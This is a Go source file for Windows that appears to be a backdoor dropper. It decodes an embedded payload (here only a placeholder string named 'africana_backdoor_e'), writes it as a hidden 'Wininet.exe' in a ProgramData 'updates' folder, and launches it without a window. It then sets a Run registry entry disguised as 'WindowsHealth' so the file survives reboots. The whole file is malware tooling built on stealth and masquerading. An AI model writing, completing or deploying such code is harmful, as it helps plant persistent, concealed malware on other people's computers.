package main

import (
    "os"
    "unsafe"
    "syscall"
    "path/filepath"
    "encoding/base64"
)

var (
    kernel32 = syscall.NewLazyDLL("kernel32.dll")
    advapi32 = syscall.NewLazyDLL("advapi32.dll")
)

const (
    KEY_SET_VALUE    = 0x0002
    KEY_QUERY_VALUE  = 0x0001
    KEY_ALL_ACCESS   = 0xF003F
    REG_SZ           = 1
    CREATE_NO_WINDOW = 0x08000000
)

func executeHidden(path string) bool {
    var si syscall.StartupInfo
    var pi syscall.ProcessInformation
    si.Cb = uint32(unsafe.Sizeof(si))
    si.Flags = syscall.STARTF_USESHOWWINDOW
    si.ShowWindow = syscall.SW_HIDE

    pathPtr, _ := syscall.UTF16PtrFromString(path)
    ret, _, _ := kernel32.NewProc("CreateProcessW").Call(
        0,
        uintptr(unsafe.Pointer(pathPtr)),
        0,
        0,
        0,
        CREATE_NO_WINDOW,
        0,
        0,
        uintptr(unsafe.Pointer(&si)),
        uintptr(unsafe.Pointer(&pi)),
    )

    if ret == 0 {
        return false
    }

    syscall.CloseHandle(syscall.Handle(pi.Process))
    syscall.CloseHandle(syscall.Handle(pi.Thread))
    return true
}

func deleteRegistryKey(valueName string) {
    regKey := `Software\Microsoft\Windows\CurrentVersion\Run`

    var hKey uintptr
    RegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
    ret, _, _ := RegOpenKeyEx.Call(
        uintptr(0x80000001),
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(regKey))),
        0,
        uintptr(KEY_ALL_ACCESS),
        uintptr(unsafe.Pointer(&hKey)),
    )

    if ret != 0 {
        return
    }
    defer syscall.CloseHandle(syscall.Handle(hKey))

    RegDeleteValue := advapi32.NewProc("RegDeleteValueW")
    RegDeleteValue.Call(
        hKey,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(valueName))),
    )
}

func addRegistryPersistence(targetPath string) {
    regKey := `Software\Microsoft\Windows\CurrentVersion\Run`
    valueName := "WindowsHealth"

    deleteRegistryKey(valueName)

    var hKey uintptr
    RegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
    ret, _, _ := RegOpenKeyEx.Call(
        uintptr(0x80000001),
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(regKey))),
        0,
        uintptr(KEY_SET_VALUE),
        uintptr(unsafe.Pointer(&hKey)),
    )

    if ret != 0 {
        return
    }
    defer syscall.CloseHandle(syscall.Handle(hKey))

    RegSetValueEx := advapi32.NewProc("RegSetValueExW")
    RegSetValueEx.Call(
        hKey,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(valueName))),
        0,
        uintptr(REG_SZ),
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(targetPath))),
        uintptr((len(targetPath)+1)*2),
    )
}

func main() {
    payload, _ := base64.StdEncoding.DecodeString("africana_backdoor_e")

    updatesFolder := filepath.Join(os.Getenv("ProgramData"), "updates")
    os.MkdirAll(updatesFolder, 0755)

    targetPath := filepath.Join(updatesFolder, "Wininet.exe")

    os.WriteFile(targetPath, payload, 0644)

    syscall.Syscall(
        kernel32.NewProc("SetFileAttributesW").Addr(),
        2,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(targetPath))),
        syscall.FILE_ATTRIBUTE_HIDDEN,
        0,
    )

    executeHidden(targetPath)
    addRegistryPersistence(targetPath)
}
